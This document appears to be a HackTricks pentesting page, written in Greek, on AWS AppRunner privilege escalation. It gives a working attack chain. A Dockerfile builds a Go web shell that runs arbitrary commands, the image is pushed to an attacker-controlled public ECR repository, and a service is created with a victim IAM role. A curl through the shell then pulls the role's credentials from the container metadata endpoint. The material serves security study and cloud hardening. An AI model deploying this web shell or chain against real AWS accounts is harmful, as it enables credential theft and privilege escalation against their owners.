# AWS - AppRunner Privesc

{{#include ../../../banners/hacktricks-training.md}}

## AppRunner

### `iam:PassRole`, `apprunner:CreateService`

Ένας επιτιθέμενος με αυτές τις άδειες μπορεί να δημιουργήσει μια υπηρεσία AppRunner με συνημμένο ρόλο IAM, ενδεχομένως κλιμακώνοντας τα προνόμια αποκτώντας πρόσβαση στα διαπιστευτήρια του ρόλου.

Ο επιτιθέμενος πρώτα δημιουργεί ένα Dockerfile που λειτουργεί ως web shell για να εκτελεί αυθαίρετες εντολές στο κοντέινερ AppRunner.
```Dockerfile
FROM golang:1.24-bookworm
WORKDIR /app
RUN apt-get update && apt-get install -y ca-certificates curl
RUN cat <<'EOF' > main.go
package main

import (
"fmt"
"net/http"
"os/exec"
)

func main() {
http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
command := exec.Command("sh", "-c", r.URL.Query().Get("cmd"))
output, err := command.CombinedOutput()
if err != nil {
fmt.Fprint(w, err.Error(), output)
return
}

fmt.Fprint(w, string(output))
})
http.ListenAndServe("0.0.0.0:3000", nil)
}
EOF
RUN go mod init test && go build -o main .
EXPOSE 3000
CMD ["./main"]
```
Στη συνέχεια, σπρώξτε αυτή την εικόνα σε ένα αποθετήριο ECR. Με το να σπρώξετε την εικόνα σε ένα δημόσιο αποθετήριο σε έναν λογαριασμό AWS που ελέγχεται από τον επιτιθέμενο, είναι δυνατή η κλιμάκωση προνομίων ακόμη και αν ο λογαριασμός του θύματος δεν έχει άδειες για να χειριστεί το ECR.
```sh
IMAGE_NAME=public.ecr.aws/<alias>/<namespace>/<repo-name>:latest
docker buildx build --platform linux/amd64 -t $IMAGE_NAME .
aws ecr-public get-login-password | docker login --username AWS --password-stdin public.ecr.aws
docker push $IMAGE_NAME
docker logout public.ecr.aws
```
Στη συνέχεια, ο επιτιθέμενος δημιουργεί μια υπηρεσία AppRunner ρυθμισμένη με αυτή την εικόνα web shell και τον IAM Ρόλο που θέλει να εκμεταλλευτεί.
```bash
aws apprunner create-service \
--service-name malicious-service \
--source-configuration '{
"ImageRepository": {
"ImageIdentifier": "public.ecr.aws/<alias>/<namespace>/<repo-name>:latest",
"ImageRepositoryType": "ECR_PUBLIC",
"ImageConfiguration": { "Port": "3000" }
}
}' \
--instance-configuration '{"InstanceRoleArn": "arn:aws:iam::123456789012:role/AppRunnerRole"}' \
--query Service.ServiceUrl
```
Αφού περιμένετε να ολοκληρωθεί η δημιουργία της υπηρεσίας, χρησιμοποιήστε το web shell για να ανακτήσετε τα διαπιστευτήρια του κοντέινερ και να αποκτήσετε τις άδειες του IAM Role που είναι συνδεδεμένο με το AppRunner.
```sh
curl 'https://<service-url>/?cmd=curl+http%3A%2F%2F169.254.170.2%24AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'
```
**Πιθανές Επιπτώσεις:** Άμεση κλιμάκωση προνομίων σε οποιονδήποτε ρόλο IAM που μπορεί να προσαρτηθεί σε υπηρεσίες AppRunner.

{{#include ../../../banners/hacktricks-training.md}}
